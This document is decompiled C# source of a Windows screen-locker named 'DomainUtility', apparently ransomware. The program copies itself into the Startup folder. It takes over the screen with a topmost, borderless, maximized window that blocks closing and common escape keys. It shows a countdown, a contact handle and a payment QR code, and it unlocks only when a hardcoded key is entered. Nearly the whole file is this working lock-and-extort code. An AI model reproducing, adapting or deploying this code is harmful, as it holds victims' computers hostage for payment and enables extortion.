using System;
using System.ComponentModel;
using System.Configuration;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using DomainUtility.Properties;

namespace DomainUtility;

public class DomainUtility : Form
{
	private static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);

	private const uint SWP_NOSIZE = 1u;

	private const uint SWP_NOMOVE = 2u;

	private const uint TOPMOST_FLAGS = 3u;

	public static string AppName = AppDomain.CurrentDomain.FriendlyName;

	private int hour = Settings.Default.Hour;

	private int min = Settings.Default.Min;

	private int sec = Settings.Default.Sec;

	private IContainer components;

	private Panel panel1;

	private Label label1;

	private PictureBox pictureBox1;

	private GroupBox groupBox1;

	private TextBox TextBox1;

	private PictureBox pictureBox3;

	private PictureBox pictureBox2;

	private Timer Runtime;

	private Timer Service;

	private Label Lbl_time;

	private PictureBox pictureBox4;

	private Label label2;

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			createParams.set_ExStyle(createParams.get_ExStyle() | 0x80);
			return createParams;
		}
	}

	public DomainUtility(Screen screen)
	{
		InitializeComponent();
	}

	[DllImport("user32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

	public static void RegisterInStartup(bool isChecked)
	{
		if (isChecked)
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup).Trim() + "\\" + AppName))
			{
				File.Move(Application.get_StartupPath() + "\\" + AppName, Environment.GetFolderPath(Environment.SpecialFolder.Startup).Trim() + "\\" + AppName);
			}
		}
		else if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup).Trim() + "\\" + AppName))
		{
			File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup).Trim() + "\\" + AppName);
		}
	}

	[STAThread]
	private static void Main()
	{
		try
		{
			new Thread((ThreadStart)delegate
			{
				RegisterInStartup(isChecked: true);
			}).Start();
		}
		catch
		{
		}
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		Application.Run((Form)(object)new DomainUtility(null));
	}

	private void DomainUtility_Load(object sender, EventArgs e)
	{
		SetWindowPos(((Control)this).get_Handle(), HWND_TOPMOST, 0, 0, 0, 0, 3u);
		((Control)TextBox1).Focus();
		Runtime.Start();
		Service.Start();
	}

	private void Runtime_Tick(object sender, EventArgs e)
	{
		sec--;
		if (sec == 0)
		{
			min--;
			sec = 59;
		}
		if (min == 0)
		{
			hour--;
			min = 59;
		}
		Settings.Default.Hour = hour;
		Settings.Default.Min = min;
		Settings.Default.Sec = sec;
		((SettingsBase)Settings.Default).Save();
		((Control)Lbl_time).set_Text(hour + ":" + min + ":" + sec);
	}

	private void TextBox1_KeyDown(object sender, KeyEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Invalid comparison between Unknown and I4
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Invalid comparison between Unknown and I4
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Invalid comparison between Unknown and I4
		//IL_0089: Unknown result type (might be due to invalid IL or missing references)
		//IL_0090: Invalid comparison between Unknown and I4
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ad: Invalid comparison between Unknown and I4
		//IL_00c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cd: Invalid comparison between Unknown and I4
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ea: Invalid comparison between Unknown and I4
		//IL_0100: Unknown result type (might be due to invalid IL or missing references)
		//IL_0107: Invalid comparison between Unknown and I4
		//IL_0125: Unknown result type (might be due to invalid IL or missing references)
		//IL_012c: Invalid comparison between Unknown and I4
		//IL_014a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0151: Invalid comparison between Unknown and I4
		//IL_016f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0176: Invalid comparison between Unknown and I4
		if ((int)e.get_KeyCode() == 13)
		{
			if (((Control)TextBox1).get_Text() == "JHA7236-HACHIMAN-37JHAl924-JFHACHI")
			{
				try
				{
					RegisterInStartup(isChecked: false);
				}
				catch
				{
				}
				Process.GetCurrentProcess().Kill();
			}
			else
			{
				MessageBox.Show("False Key!", "Failure!");
			}
		}
		if ((int)e.get_KeyCode() == 262144)
		{
			e.set_SuppressKeyPress(true);
			((Control)TextBox1).Focus();
		}
		if ((int)e.get_KeyCode() == 131072)
		{
			e.set_SuppressKeyPress(true);
			((Control)TextBox1).Focus();
		}
		if ((int)e.get_KeyCode() == 32)
		{
			e.set_SuppressKeyPress(true);
			((Control)TextBox1).Focus();
		}
		if ((int)e.get_KeyCode() == 36)
		{
			e.set_SuppressKeyPress(true);
			((Control)TextBox1).Focus();
		}
		if ((int)e.get_KeyCode() == 170)
		{
			e.set_SuppressKeyPress(true);
			((Control)TextBox1).Focus();
		}
		if ((int)e.get_KeyCode() == 27)
		{
			e.set_SuppressKeyPress(true);
			((Control)TextBox1).Focus();
		}
		if ((int)e.get_KeyCode() == 9)
		{
			e.set_SuppressKeyPress(true);
			((Control)TextBox1).Focus();
		}
		if (e.get_Alt() && (int)e.get_KeyCode() == 9)
		{
			e.set_SuppressKeyPress(true);
			((Control)TextBox1).Focus();
		}
		if (e.get_Alt() && (int)e.get_KeyCode() == 27)
		{
			e.set_SuppressKeyPress(true);
			((Control)TextBox1).Focus();
		}
		if (e.get_Control() && (int)e.get_KeyCode() == 115)
		{
			e.set_SuppressKeyPress(true);
			((Control)TextBox1).Focus();
		}
	}

	private void Service_Tick(object sender, EventArgs e)
	{
		((Control)TextBox1).Focus();
		((Form)this).set_WindowState((FormWindowState)2);
	}

	private void DomainUtility_FormClosing(object sender, FormClosingEventArgs e)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		((CancelEventArgs)(object)e).Cancel = true;
		MessageBox.Show("");
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Expected O, but got Unknown
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Expected O, but got Unknown
		//IL_01dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e7: Expected O, but got Unknown
		//IL_027b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0285: Expected O, but got Unknown
		//IL_03a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b0: Expected O, but got Unknown
		//IL_0421: Unknown result type (might be due to invalid IL or missing references)
		//IL_042b: Expected O, but got Unknown
		//IL_04a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_04aa: Expected O, but got Unknown
		//IL_07a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_07ac: Expected O, but got Unknown
		//IL_07e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_07f0: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(DomainUtility));
		panel1 = new Panel();
		Lbl_time = new Label();
		label1 = new Label();
		groupBox1 = new GroupBox();
		TextBox1 = new TextBox();
		Runtime = new Timer(components);
		Service = new Timer(components);
		label2 = new Label();
		pictureBox2 = new PictureBox();
		pictureBox3 = new PictureBox();
		pictureBox4 = new PictureBox();
		pictureBox1 = new PictureBox();
		((Control)panel1).SuspendLayout();
		((Control)groupBox1).SuspendLayout();
		((ISupportInitialize)pictureBox2).BeginInit();
		((ISupportInitialize)pictureBox3).BeginInit();
		((ISupportInitialize)pictureBox4).BeginInit();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)panel1).get_Controls().Add((Control)(object)pictureBox4);
		((Control)panel1).get_Controls().Add((Control)(object)label2);
		((Control)panel1).get_Controls().Add((Control)(object)Lbl_time);
		((Control)panel1).get_Controls().Add((Control)(object)label1);
		((Control)panel1).get_Controls().Add((Control)(object)pictureBox1);
		((Control)panel1).set_Dock((DockStyle)1);
		((Control)panel1).set_Location(new Point(0, 0));
		((Control)panel1).set_Name("panel1");
		((Control)panel1).set_Size(new Size(1386, 100));
		((Control)panel1).set_TabIndex(0);
		((Control)Lbl_time).set_AutoSize(true);
		((Control)Lbl_time).set_Dock((DockStyle)3);
		((Control)Lbl_time).set_Font(new Font("Impact", 48f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Lbl_time).set_ForeColor(Color.Red);
		((Control)Lbl_time).set_Location(new Point(200, 0));
		((Control)Lbl_time).set_Name("Lbl_time");
		((Control)Lbl_time).set_Size(new Size(264, 80));
		((Control)Lbl_time).set_TabIndex(4);
		((Control)Lbl_time).set_Text("00:00:00");
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Dock((DockStyle)3);
		((Control)label1).set_Font(new Font("Consolas", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.Red);
		((Control)label1).set_Location(new Point(100, 0));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(100, 44));
		((Control)label1).set_TabIndex(1);
		((Control)label1).set_Text("Hachiman\r\n914751514");
		((Control)groupBox1).get_Controls().Add((Control)(object)TextBox1);
		((Control)groupBox1).set_Dock((DockStyle)1);
		((Control)groupBox1).set_ForeColor(SystemColors.Control);
		((Control)groupBox1).set_Location(new Point(0, 100));
		((Control)groupBox1).set_Name("groupBox1");
		((Control)groupBox1).set_Size(new Size(1386, 92));
		((Control)groupBox1).set_TabIndex(14);
		groupBox1.set_TabStop(false);
		((Control)groupBox1).set_Text("Key to unlock");
		((Control)TextBox1).set_BackColor(Color.FromArgb(40, 40, 40));
		((Control)TextBox1).set_Font(new Font("Consolas", 18f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)TextBox1).set_ForeColor(SystemColors.Control);
		((Control)TextBox1).set_Location(new Point(26, 35));
		((TextBoxBase)TextBox1).set_Multiline(true);
		((Control)TextBox1).set_Name("TextBox1");
		((Control)TextBox1).set_Size(new Size(1015, 34));
		((Control)TextBox1).set_TabIndex(10);
		((Control)TextBox1).add_KeyDown(new KeyEventHandler(TextBox1_KeyDown));
		Runtime.set_Interval(1000);
		Runtime.add_Tick((EventHandler)Runtime_Tick);
		Service.set_Interval(1);
		Service.add_Tick((EventHandler)Service_Tick);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Dock((DockStyle)3);
		((Control)label2).set_Font(new Font("Consolas", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(Color.Red);
		((Control)label2).set_Location(new Point(464, 0));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(160, 66));
		((Control)label2).set_TabIndex(5);
		((Control)label2).set_Text("You can\r\nalso scan \r\nqr for payment:");
		((Control)pictureBox2).set_Dock((DockStyle)4);
		pictureBox2.set_Image((Image)(object)Resources.favicon22);
		((Control)pictureBox2).set_Location(new Point(583, 192));
		((Control)pictureBox2).set_Name("pictureBox2");
		((Control)pictureBox2).set_Size(new Size(803, 516));
		pictureBox2.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox2.set_TabIndex(19);
		pictureBox2.set_TabStop(false);
		((Control)pictureBox3).set_Dock((DockStyle)3);
		pictureBox3.set_Image((Image)(object)Resources.favicon4);
		((Control)pictureBox3).set_Location(new Point(0, 192));
		((Control)pictureBox3).set_Name("pictureBox3");
		((Control)pictureBox3).set_Size(new Size(577, 516));
		pictureBox3.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox3.set_TabIndex(18);
		pictureBox3.set_TabStop(false);
		((Control)pictureBox4).set_Dock((DockStyle)3);
		pictureBox4.set_Image((Image)(object)Resources.qr);
		((Control)pictureBox4).set_Location(new Point(624, 0));
		((Control)pictureBox4).set_Name("pictureBox4");
		((Control)pictureBox4).set_Size(new Size(100, 100));
		pictureBox4.set_SizeMode((PictureBoxSizeMode)4);
		pictureBox4.set_TabIndex(6);
		pictureBox4.set_TabStop(false);
		((Control)pictureBox1).set_Dock((DockStyle)3);
		pictureBox1.set_Image((Image)(object)Resources.file);
		((Control)pictureBox1).set_Location(new Point(0, 0));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(100, 100));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)4);
		pictureBox1.set_TabIndex(0);
		pictureBox1.set_TabStop(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.FromArgb(45, 45, 45));
		((Form)this).set_ClientSize(new Size(1386, 708));
		((Control)this).get_Controls().Add((Control)(object)pictureBox2);
		((Control)this).get_Controls().Add((Control)(object)pictureBox3);
		((Control)this).get_Controls().Add((Control)(object)groupBox1);
		((Control)this).get_Controls().Add((Control)(object)panel1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("DomainUtility");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("DomainUtility");
		((Form)this).set_WindowState((FormWindowState)2);
		((Form)this).add_FormClosing(new FormClosingEventHandler(DomainUtility_FormClosing));
		((Form)this).add_Load((EventHandler)DomainUtility_Load);
		((Control)panel1).ResumeLayout(false);
		((Control)panel1).PerformLayout();
		((Control)groupBox1).ResumeLayout(false);
		((Control)groupBox1).PerformLayout();
		((ISupportInitialize)pictureBox2).EndInit();
		((ISupportInitialize)pictureBox3).EndInit();
		((ISupportInitialize)pictureBox4).EndInit();
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
	}
}
